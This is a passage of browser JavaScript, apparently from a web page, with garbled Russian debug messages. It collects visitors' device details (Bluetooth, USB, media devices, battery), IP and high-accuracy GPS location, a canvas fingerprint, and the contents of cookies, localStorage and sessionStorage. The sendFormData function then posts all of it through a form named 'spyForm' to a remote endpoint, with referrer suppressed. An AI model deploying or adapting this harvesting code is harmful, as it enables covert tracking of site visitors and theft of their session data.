                debugLog('–ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê –≤ Bluetooth:', error);
                result.available = false;
                result.error = error.message;
                result.status = 'error';
                result.details.error = error.message;
            }

            debugLog('üìä –ò–¢–û–ì Bluetooth:', {
                available: result.available,
                isAvailable: result.details.isAvailable,
                permissions: result.details.permissions,
                devicesCount: result.details.pairedDevicesCount,
                canScan: result.details.canScan
            });

            debugLog('=== BLUETOOTH COLLECTION END ===');
            return result;
        }

        async function collectUSBInfo() {
            debugLog('=== USB COLLECTION START ===');

            const result = {
                available: 'usb' in navigator,
                error: null,
                status: 'success',
                details: {
                    permissionState: 'unknown',
                    connectedDevicesCount: 0
                },
                devices: [],
                timestamp: new Date().toISOString()
            };

            debugLog('1. USB –≤ navigator?', result.available);

            if (!result.available) {
                debugLog('USB API –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ navigator');
                result.error = 'USB API not supported';
                result.status = 'not_supported';
                debugLog('=== USB COLLECTION END (not supported) ===');
                return result;
            }

            debugLog('‚úÖ USB API –¥–æ—Å—Ç—É–ø–µ–Ω');
            debugLog('2. navigator.usb –æ–±—ä–µ–∫—Ç:', {
                getDevices: typeof navigator.usb.getDevices,
                requestDevice: typeof navigator.usb.requestDevice
            });

            try {
                debugLog('3. –ü—Ä–æ–≤–µ—Ä—è–µ–º Permissions API...');
                if (navigator.permissions && navigator.permissions.query) {
                    debugLog('‚úÖ Permissions API –¥–æ—Å—Ç—É–ø–µ–Ω');

                    const permissionNames = ['usb', 'usb-device'];
                    let permissionFound = false;

                    for (const name of permissionNames) {
                        try {
                            debugLog(`4. –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º permission: ${name}`);
                            const permission = await navigator.permissions.query({ name });
                            debugLog(`   –†–µ–∑—É–ª—å—Ç–∞—Ç –¥–ª—è ${name}:`, permission.state);

                            if (permission.state) {
                                result.details.permissionState = permission.state;
                                permissionFound = true;
                                break;
                            }
                        } catch (permError) {
                            debugLog(`‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ permission ${name}:`, permError.message);
                        }
                    }

                    if (!permissionFound) {
                        debugLog('‚ö†Ô∏è –ù–∏ –æ–¥–∏–Ω permission –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª');
                        result.details.permissionState = 'not_supported';
                    }
                } else {
                    debugLog('‚ùå Permissions API –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                    result.details.permissionState = 'no_permissions_api';
                }

                debugLog('5. –ü—Ä–æ–≤–µ—Ä—è–µ–º getDevices()...');
                if (navigator.usb.getDevices) {
                    debugLog('‚úÖ getDevices() –¥–æ—Å—Ç—É–ø–µ–Ω');
                    try {
                        const devices = await navigator.usb.getDevices();
                        result.details.connectedDevicesCount = devices.length;
                        debugLog(`6. –ù–∞–π–¥–µ–Ω–æ USB —É—Å—Ç—Ä–æ–π—Å—Ç–≤: ${devices.length}`);

                        result.devices = devices.map(device => ({
                            vendorId: device.vendorId,
                            productId: device.productId,
                            productName: device.productName || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ USB —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ',
                            manufacturerName: device.manufacturerName || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å',
                            serialNumber: device.serialNumber || '–ù–µ—Ç',
                            opened: device.opened,
                            usbVersion: device.usbVersionMajor ?
                                `USB ${device.usbVersionMajor}.${device.usbVersionMinor}` : 'unknown',
                            configurations: device.configurations?.length || 0
                        }));

                        if (devices.length > 0) {
                            debugLog('7. USB —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', devices.map(d => ({
                                productName: d.productName,
                                vendorId: d.vendorId.toString(16),
                                productId: d.productId.toString(16)
                            })));
                        }
                    } catch (devicesError) {
                        debugLog('‚ùå –û—à–∏–±–∫–∞ getDevices:', devicesError.message);
                        result.details.getDevicesError = devicesError.message;
                    }
                } else {
                    debugLog('‚ö†Ô∏è getDevices() –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                }

                result.details.functions = {
                    getDevices: typeof navigator.usb.getDevices === 'function',
                    requestDevice: typeof navigator.usb.requestDevice === 'function'
                };

                debugLog('8. –ò—Ç–æ–≥–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏:', result.details.functions);

            } catch (error) {
                debugLog('üí• –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê –≤ USB:', error);
                result.available = false;
                result.error = error.message;
                result.status = 'error';
                result.details.error = error.message;
            }

            debugLog('üìä –ò–¢–û–ì USB:', {
                available: result.available,
                permissionState: result.details.permissionState,
                devicesCount: result.details.connectedDevicesCount
            });

            debugLog('=== USB COLLECTION END ===');
            return result;
        }

        async function getFontsInfo() {
            if (!document.fonts || !document.fonts.ready) {
                return { available: false };
            }

            try {
                await document.fonts.ready;
                const fonts = [];
                for (const font of document.fonts) {
                    fonts.push(font.family);
                }
                return {
                    available: true,
                    count: fonts.length,
                    uniqueCount: [...new Set(fonts)].length,
                    sample: fonts.slice(0, 10)
                };
            } catch (error) {
                return { available: false, error: error.message };
            }
        }

        function getMimeTypesInfo() {
            if (!navigator.mimeTypes) {
                return { available: false };
            }

            const mimeTypes = [];
            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                const mimeType = navigator.mimeTypes[i];
                mimeTypes.push({
                    type: mimeType.type,
                    description: mimeType.description,
                    enabled: mimeType.enabledPlugin ? true : false
                });
            }

            return {
                available: true,
                count: mimeTypes.length,
                types: mimeTypes.slice(0, 20)
            };
        }

        function getCSPInfo() {
            const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
            const cspHeader = document.querySelector('meta[http-equiv="Content-Security-Policy-Report-Only"]');

            return {
                hasCSP: !!cspMeta,
                hasReportOnly: !!cspHeader,
                cspContent: cspMeta ? cspMeta.content : null,
                reportOnlyContent: cspHeader ? cspHeader.content : null
            };
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) {
                return { available: false };
            }

            try {
                const battery = await navigator.getBattery();
                return {
                    available: true,
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (error) {
                return { available: false, error: error.message };
            }
        }

        function collectBrowserInfo() {
            const isFileProtocol = window.location.protocol === 'file:';

            return {
                name: getBrowserName(),
                version: getBrowserVersion(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor || 'unknown',
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: isFileProtocol ? 'not_supported_in_file_protocol' : navigator.cookieEnabled,
                online: navigator.onLine,
                doNotTrack: navigator.doNotTrack || 'unspecified',
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                product: navigator.product,
                protocol: window.location.protocol,
                isLocalFile: isFileProtocol,
                userAgentLength: navigator.userAgent ? navigator.userAgent.length : 0,
                isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                isTablet: /Tablet|iPad|Android(?!.*Mobile)/i.test(navigator.userAgent),
                parsedOS: parseOSFromUserAgent(navigator.userAgent),
                isChromium: /Chrome|Chromium|Edg|OPR/i.test(navigator.userAgent),
                isEdge: /Edg/i.test(navigator.userAgent),
                isOpera: /OPR/i.test(navigator.userAgent)
            };
        }

        function parseOSFromUserAgent(ua) {
            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
            if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
            if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
            if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
            if (/Mac OS X/.test(ua)) return 'macOS';
            if (/Linux/.test(ua)) return 'Linux';
            if (/Android/.test(ua)) return 'Android';
            if (/iOS|iPhone|iPad|iPod/.test(ua)) return 'iOS';
            return 'Unknown';
        }

        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
            if (ua.includes('Edg')) return 'Edge';
            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
            if (ua.includes('Trident') || ua.includes('MSIE')) return 'Internet Explorer';
            return 'Unknown';
        }

        function getBrowserVersion() {
            const ua = navigator.userAgent;

            if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
                const safariMatch = ua.match(/Version\/(\d+)/);
                if (safariMatch) return safariMatch[1];
            }

            const matches = ua.match(/(chrome|firefox|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i) || [];

            return matches[2] || 'unknown';
        }

        function collectSystemInfo() {
            return {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type || 'unknown',
                    pixelRatio: window.devicePixelRatio || 1,
                    colorGamut: getColorGamut(),
                    hdr: checkHDRSupport(),
                    orientationAngle: screen.orientation?.angle || 0
                },
                window: {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    devicePixelRatio: window.devicePixelRatio,
                    orientation: window.orientation || 'unknown'
                },
                hardware: {
                    hardwareConcurrency: navigator.hardwareConcurrency || null,
                    deviceMemory: navigator.deviceMemory || null,
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    hasTouchScreen: navigator.maxTouchPoints > 0,
                    estimatedCores: estimateCPUcores()
                },
                time: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    locale: Intl.DateTimeFormat().resolvedOptions().locale
                },
                performance: {
                    memory: performance.memory ? {
                        totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1024 / 1024) + ' MB',
                        usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + ' MB',
                        jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024) + ' MB'
                    } : null,
                    timing: performance.timing ? {
                        loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart + 'ms',
                        domReadyTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart + 'ms'
                    } : null
                }
            };
        }

        function getColorGamut() {
            if (window.matchMedia) {
                if (matchMedia('(color-gamut: rec2020)').matches) return 'rec2020';
                if (matchMedia('(color-gamut: p3)').matches) return 'p3';
                if (matchMedia('(color-gamut: srgb)').matches) return 'srgb';
            }
            return 'unknown';
        }

        function checkHDRSupport() {
            if (window.matchMedia) {
                return matchMedia('(dynamic-range: high)').matches;
            }
            return false;
        }

        function estimateCPUcores() {
            if (navigator.hardwareConcurrency) return navigator.hardwareConcurrency;

            const ua = navigator.userAgent || '';
            if (/Mobile|Android|iPhone/.test(ua)) return 4;
            if (/Tablet|iPad/.test(ua)) return 4;

            return 2;
        }

        async function collectLocationInfo() {
            debugLog('–ù–∞—á–∞–ª–æ —Å–±–æ—Ä–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏');

            const result = {
                available: true,
                error: null,
                status: 'success',
                details: {
                    ipBased: {},
                    precise: null,
                    estimatedByTimezone: {}
                },
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipInfo = await response.json();
                result.details.ipBased.ip = ipInfo.ip;

                try {
                    const geoResponse = await fetch(`https://ipapi.co/${ipInfo.ip}/json/`);
                    if (geoResponse.ok) {
                        const geoData = await geoResponse.json();
                        result.details.ipBased = {
                            ...result.details.ipBased,
                            ...geoData,
                            country: geoData.country_name,
                            country_code: geoData.country_code,
                            region: geoData.region,
                            city: geoData.city,
                            postal: geoData.postal,
                            latitude: geoData.latitude,
                            longitude: geoData.longitude,
                            timezone: geoData.timezone,
                            currency: geoData.currency,
                            languages: geoData.languages,
                            isp: geoData.org,
                            org: geoData.org,
                            as: geoData.asn,
                            mobile: geoData.mobile || false,
                            proxy: geoData.proxy || false,
                            hosting: geoData.hosting || false
                        };
                    } else {
                        result.details.ipBased.geoError = `HTTP ${geoResponse.status}`;
                    }
                } catch (geoError) {
                    result.details.ipBased.geoError = geoError.message;
                }
            } catch (error) {
                result.available = false;
                result.error = '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ IP';
                result.status = 'error';
                result.details.ipBased.error = error.message;
            }

            if ('geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        const timeoutId = setTimeout(() => {
                            reject(new Error('Geolocation timeout: 12s exceeded'));
                        }, 12000);

                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                clearTimeout(timeoutId);
                                resolve(pos);
                            },
                            (err) => {
                                clearTimeout(timeoutId);
                                reject(err);
                            },
                            {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    });

                    result.details.precise = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' –º–µ—Ç—Ä–æ–≤',
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    };

                } catch (error) {
                    result.details.precise = {
                        error: error.message,
                        code: error.code || 'unknown'
                    };
                }
            } else {
                result.details.precise = {
                    error: 'Geolocation API not supported',
                    code: 'not_supported'
                };
            }

            result.details.estimatedByTimezone = {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language
            };

            return result;
        }

        async function collectMediaInfo() {
            debugLog('=== MEDIA COLLECTION START ===');

            const result = {
                available: false,
                error: null,
                status: 'not_available',
                details: {
                    devices: [],
                    screen: {},
                    summary: {},
                    systemInfo: {}
                },
                timestamp: new Date().toISOString()
            };

            if (!('mediaDevices' in navigator)) {
                debugLog('MediaDevices API –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
                result.error = 'MediaDevices API –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è';
                debugLog('=== MEDIA COLLECTION END (not supported) ===');
                return result;
            }

            debugLog('‚úÖ MediaDevices API –¥–æ—Å—Ç—É–ø–µ–Ω');

            try {
                debugLog('1. –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤ —á–µ—Ä–µ–∑ enumerateDevices()');
                const devices = await navigator.mediaDevices.enumerateDevices();
                debugLog(`2. –í—Å–µ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤: ${devices.length}`);

                if (devices.length === 0) {
                    debugLog('‚ö†Ô∏è –£—Å—Ç—Ä–æ–π—Å—Ç–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ');
                } else {
                    debugLog('3. –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤:', devices.map(d => ({
                        kind: d.kind,
                        label: d.label || '–ù–µ —É–∫–∞–∑–∞–Ω–æ',
                        deviceId: d.deviceId ? '–µ—Å—Ç—å' : '–Ω–µ—Ç'
                    })));
                }

                const detailedDevices = [];
                const deviceCounts = {
                    videoinput: 0,
                    audioinput: 0,
                    audiooutput: 0
                };

                for (const device of devices) {
                    const details = {
                        kind: device.kind,
                        label: device.label || '–ù–µ —É–∫–∞–∑–∞–Ω–æ',
                        deviceId: device.deviceId ? device.deviceId.substring(0, 10) + '...' : 'none',
                        groupId: device.groupId ? device.groupId.substring(0, 10) + '...' : 'none',
                        type: getDeviceType(device.kind)
                    };

                    deviceCounts[device.kind] = (deviceCounts[device.kind] || 0) + 1;
                    detailedDevices.push(details);
                }

                debugLog('4. –°—á–µ—Ç—á–∏–∫–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤:', deviceCounts);

                const videoDevices = devices.filter(d => d.kind === 'videoinput');
                if (videoDevices.length > 0) {
                    debugLog(`5. –ù–∞–π–¥–µ–Ω–æ –∫–∞–º–µ—Ä: ${videoDevices.length}`);
                    debugLog('   –ü–æ–ø—ã—Ç–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Ç–∏–ø —Ç–æ–ª—å–∫–æ –ø–µ—Ä–≤–æ–π –∫–∞–º–µ—Ä—ã...');

                    try {
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 3000);

                        const stream = await navigator.mediaDevices.getUserMedia({
                            video: { deviceId: { exact: videoDevices[0].deviceId } }
                        }).catch(() => null);

                        clearTimeout(timeoutId);

                        if (stream) {
                            const track = stream.getVideoTracks()[0];
                            const settings = track.getSettings();

                            result.details.systemInfo = {
                                hasFrontCamera: settings.facingMode === 'user',
                                hasBackCamera: settings.facingMode === 'environment',
                                hasExternalCamera: !['user', 'environment'].includes(settings.facingMode)
                            };

                            debugLog('6. –¢–∏–ø –∫–∞–º–µ—Ä—ã –æ–ø—Ä–µ–¥–µ–ª–µ–Ω:', settings.facingMode);

                            track.stop();
                            stream.getTracks().forEach(t => t.stop());
                        } else {
                            debugLog('6. –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –Ω–µ –ø–æ–ª—É—á–µ–Ω (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–∫–∞–∑–∞–ª –∏–ª–∏ —Ç–∞–π–º–∞—É—Ç)');
                            result.details.systemInfo = {
                                hasFrontCamera: false,
                                hasBackCamera: false,
                                hasExternalCamera: false
                            };
                        }
                    } catch (mediaError) {
                        debugLog('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ —Ç–∏–ø–∞ –∫–∞–º–µ—Ä—ã:', mediaError.message);
                        result.details.systemInfo = {
                            hasFrontCamera: false,
                            hasBackCamera: false,
                            hasExternalCamera: false
                        };
                    }
                } else {
                    debugLog('5. –ö–∞–º–µ—Ä—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã');
                    result.details.systemInfo = {
                        hasFrontCamera: false,
                        hasBackCamera: false,
                        hasExternalCamera: false
                    };
                }

                const summary = {
                    hasCamera: videoDevices.length > 0,
                    hasMicrophone: deviceCounts.audioinput > 0,
                    hasSpeakers: deviceCounts.audiooutput > 0,
                    totalDevices: devices.length,
                    cameraCount: videoDevices.length,
                    microphoneCount: deviceCounts.audioinput
                };

                debugLog('7. –ò—Ç–æ–≥–æ–≤–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:', summary);

                const screenInfo = {
                    hasScreenCapture: 'getDisplayMedia' in navigator.mediaDevices
                };

                debugLog('8. –ó–∞—Ö–≤–∞—Ç —ç–∫—Ä–∞–Ω–∞ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è?', screenInfo.hasScreenCapture);

                result.available = true;
                result.status = 'success';
                result.details.devices = detailedDevices;
                result.details.screen = screenInfo;
                result.details.summary = summary;

            } catch (error) {
                debugLog('üí• –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê –≤ Media:', error);
                result.available = false;
                result.error = error.message;
                result.status = 'error';
            }

            debugLog('üìä –ò–¢–û–ì Media:', {
                available: result.available,
                cameraCount: result.details.summary?.cameraCount,
                microphoneCount: result.details.summary?.microphoneCount,
                hasScreenCapture: result.details.screen?.hasScreenCapture
            });

            debugLog('=== MEDIA COLLECTION END ===');
            return result;
        }

        function getDeviceType(kind) {
            switch (kind) {
                case 'videoinput': return 'camera';
                case 'audioinput': return 'microphone';
                case 'audiooutput': return 'speaker';
                default: return kind;
            }
        }

        function collectNetworkInfo() {
            const info = {
                online: navigator.onLine,
                connectionType: 'unknown',
                effectiveType: 'unknown',
                downlink: null,
                rtt: null,
                saveData: false
            };

            let connection = null;

            if (navigator.connection) {
                connection = navigator.connection;
            } else if (navigator.mozConnection) {
                connection = navigator.mozConnection;
            } else if (navigator.webkitConnection) {
                connection = navigator.webkitConnection;
            } else if (navigator.network && navigator.network.connection) {
                connection = navigator.network.connection;
            }

            if (connection) {
                info.connectionType = connection.type || 'unknown';
                info.effectiveType = connection.effectiveType || 'unknown';
                info.downlink = connection.downlink;
                info.rtt = connection.rtt;
                info.saveData = connection.saveData || false;
                info.detectedAPI = 'connection found';
                info.supported = true;
            } else {
                info.connectionType = detectConnectionTypeFallBack();
                info.detectedAPI = 'no connection API found';
                info.supported = false;
            }

            return info;
        }

        function detectConnectionTypeFallBack() {
            const ua = navigator.userAgent || '';

            if (/Mobile|Android|iPhone|iPad/i.test(ua)) {
                const screenWidth = screen.width;
                if (screenWidth > 768) return 'cellular (tablet)';
                return 'cellular (mobile)';
            }

            if (performance.timing && performance.timing.loadEventEnd) {
                const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
                if (loadTime < 1000) return 'ethernet (fast)';
                if (loadTime < 3000) return 'wifi (medium)';
                return 'wifi (slow)';
            }

            const platform = navigator.platform || '';
            if (/Win|Mac|Linux/i.test(platform)) {
                return 'ethernet/wifi';
            }

            return 'unknown';
        }

        function collectCapabilitiesInfo() {
            return {
                apis: {
                    geolocation: 'geolocation' in navigator,
                    mediaDevices: 'mediaDevices' in navigator,
                    notifications: 'Notification' in window,
                    clipboard: 'clipboard' in navigator,
                    vibration: 'vibrate' in navigator,
                    serviceWorker: 'serviceWorker' in navigator,
                    storage: 'storage' in navigator,
                    bluetooth: 'bluetooth' in navigator,
                    usb: 'usb' in navigator,
                    webGL: 'WebGLRenderingContext' in window,
                    webGPU: 'GPU' in window,
                    webXR: 'xr' in navigator,
                    gamepad: 'getGamepads' in navigator
                },

                webGL: (() => {
                    try {
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

                        if (gl) {
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            return {
                                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
                                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
                                supportedExtensions: gl.getSupportedExtensions()?.length || 0
                            };
                        }
                    } catch (e) { }
                    return null;
                })(),

                storage: {
                    localStorage: testStorage('localStorage'),
                    sessionStorage: testStorage('sessionStorage'),
                    indexedDB: 'indexedDB' in window,
                    cookies: navigator.cookieEnabled
                },

                misc: {
                    pdfViewer: 'application/pdf' in navigator.mimeTypes,
                    java: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false
                }
            };
        }

        function testStorage(type) {
            try {
                const test = 'test';
                if (type === 'localStorage') {
                    localStorage.setItem(test, test);
                    localStorage.removeItem(test);
                } else {
                    sessionStorage.setItem(test, test);
                    sessionStorage.removeItem(test);
                }
                return true;
            } catch (e) {
                return false;
            }
        }

        function collectAdditionalInfo() {
            const canvasFingerprint = (() => {
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = 200;
                    canvas.height = 100;
                    const ctx = canvas.getContext('2d');

                    ctx.fillStyle = 'rgb(255, 102, 0)';
                    ctx.fillRect(10, 10, 50, 50);
                    ctx.fillStyle = 'rgba(0, 153, 255, 0.7)';
                    ctx.fillRect(30, 30, 50, 50);
                    ctx.font = '14px "Arial"';
                    ctx.fillText('Browser Fingerprint', 10, 80);

                    return canvas.toDataURL().substring(0, 100) + '...';
                } catch (e) {
                    return null;
                }
            })();

            const plugins = [];
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push({
                        name: navigator.plugins[i].name,
                        description: navigator.plugins[i].description,
                        version: navigator.plugins[i].version || null
                    });
                }
            }

            return {
                canvasFingerprint: canvasFingerprint,
                plugins: plugins,
                mimeTypes: navigator.mimeTypes?.length || 0,
                referrer: document.referrer || 'none',
                pageLoadTime: performance.timing ?
                    performance.timing.loadEventEnd - performance.timing.navigationStart + 'ms' : 'unknown'
            };
        }

        async function collectDatabaseInfo() {
            const result = {
                indexedDB: { available: false, databases: [] },
                localStorage: { available: false, data: {} },
                sessionStorage: { available: false, data: {} },
                cookies: { available: false, cookies: [] }
            };

            if ('indexedDB' in window) {
                result.indexedDB.available = true;

                try {
                    const databases = await indexedDB.databases ? indexedDB.databases() : [];

                    if (databases && databases.length > 0) {
                        result.indexedDB.databases = databases.map(db => ({
                            name: db.name,
                            version: db.version
                        }));

                        for (const dbInfo of databases.slice(0, 3)) {
                            try {
                                const db = await new Promise((resolve, reject) => {
                                    const request = indexedDB.open(dbInfo.name);
                                    request.onsuccess = () => resolve(request.result);
                                    request.onerror = () => reject(request.error);
                                    request.onupgradeneeded = () => {
                                        request.transaction.abort();
                                    };
                                });

                                const stores = [];
                                if (db.objectStoreNames) {
                                    for (const storeName of db.objectStoreNames) {
                                        const store = db.transaction(storeName).objectStore(storeName);
                                        stores.push({
                                            name: storeName,
                                            keyPath: store.keyPath,
                                            autoIncrement: store.autoIncrement,
                                            indexes: Array.from(store.indexNames).map(indexName => {
                                                const index = store.index(indexName);
                                                return {
                                                    name: index.name,
                                                    keyPath: index.keyPath,
                                                    unique: index.unique,
                                                    multiEntry: index.multiEntry
                                                };
                                            })
                                        });
                                    }
                                }

                                result.indexedDB.databases.find(d => d.name === dbInfo.name).stores = stores;
                                db.close();

                            } catch (e) { }
                        }
                    }
                } catch (error) {
                    result.indexedDB.error = error.message;
                }
            }

            if ('localStorage' in window) {
                result.localStorage.available = true;
                try {
                    const items = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        const value = localStorage.getItem(key);
                        items[key] = value ?
                            (value.length > 100 ? value.substring(0, 100) + '...' : value) :
                            null;
                    }
                    result.localStorage.data = items;
                    result.localStorage.count = Object.keys(items).length;
                } catch (e) {
                    result.localStorage.error = e.message;
                }
            }

            if ('sessionStorage' in window) {
                result.sessionStorage.available = true;
                try {
                    const items = {};
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        const value = sessionStorage.getItem(key);
                        items[key] = value ?
                            (value.length > 100 ? value.substring(0, 100) + '...' : value) :
                            null;
                    }
                    result.sessionStorage.data = items;
                    result.sessionStorage.count = Object.keys(items).length;
                } catch (e) {
                    result.sessionStorage.error = e.message;
                }
            }

            if (navigator.cookieEnabled) {
                result.cookies.available = true;
                try {
                    const cookies = document.cookie.split(';').map(c => c.trim());
                    result.cookies.cookies = cookies.filter(c => c).map(cookie => {
                        const [name, ...valueParts] = cookie.split('=');
                        return {
                            name: name,
                            value: valueParts.join('=').substring(0, 50) +
                                (valueParts.join('=').length > 50 ? '...' : ''),
                            fullLength: valueParts.join('=').length
                        };
                    });
                    result.cookies.count = result.cookies.cookies.length;
                } catch (e) {
                    result.cookies.error = e.message;
                }
            }

            if ('caches' in window) {
                try {
                    const cacheKeys = await caches.keys();
                    result.cacheAPI = {
                        available: true,
                        caches: cacheKeys,
                        count: cacheKeys.length
                    };
                } catch (e) {
                    result.cacheAPI = { available: false, error: e.message };
                }
            }

            return result;
        }

        async function sendFormData(jsonData) {
            return new Promise((resolve) => {
                try {
                    debugLog('–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Ñ–æ—Ä–º—ã –∫ –æ—Ç–ø—Ä–∞–≤–∫–µ');

                    collectedDataField.value = jsonData;

                    const formData = new FormData(spyForm);

                    fetch(spyForm.action, {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors',
                        cache: 'no-cache',
                        referrerPolicy: 'no-referrer'
                    })
                        .then(response => {
                            debugLog('Fetch –æ—Ç–≤–µ—Ç –ø–æ–ª—É—á–µ–Ω', {
                                type: response.type,
                                status: response.status,
                                ok: response.ok
                            });

                            if (response.type === 'opaque') {
                                debugLog('–§–æ—Ä–º–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ (no-cors —Ä–µ–∂–∏–º)');
                                resolve(true);
                            } else if (response.ok) {
                                debugLog('–§–æ—Ä–º–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ');
                                resolve(true);
                            } else {
                                debugError(`–û—à–∏–±–∫–∞ HTTP: ${response.status}`);
                                resolve(false);
                            }
                        })
                        .catch(error => {
                            debugError('–û—à–∏–±–∫–∞ fetch –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ', error);

                            try {
                                debugLog('–ü—Ä–æ–±—É–µ–º XMLHttpRequest –∫–∞–∫ fallback');
                                const xhr = new XMLHttpRequest();
                                xhr.open('POST', spyForm.action, true);
                                xhr.timeout = 10000;

                                xhr.onload = function () {
                                    debugLog('XHR –æ—Ç–≤–µ—Ç', { status: xhr.status });
                                    if (xhr.status === 0 || xhr.status === 200 || xhr.status === 302) {
                                        resolve(true);
                                    } else {
                                        resolve(false);
                                    }
                                };

                                xhr.onerror = function () {
                                    debugError('XHR –æ—à–∏–±–∫–∞ —Å–µ—Ç–∏');
                                    resolve(false);
                                };

                                xhr.ontimeout = function () {
                                    debugError('XHR —Ç–∞–π–º–∞—É—Ç');
                                    resolve(false);
                                };

                                xhr.send(formData);
                            } catch (xhrError) {
                                debugError('–û—à–∏–±–∫–∞ –≤ XHR fallback', xhrError);
                                resolve(false);
                            }
                        });

                } catch (error) {
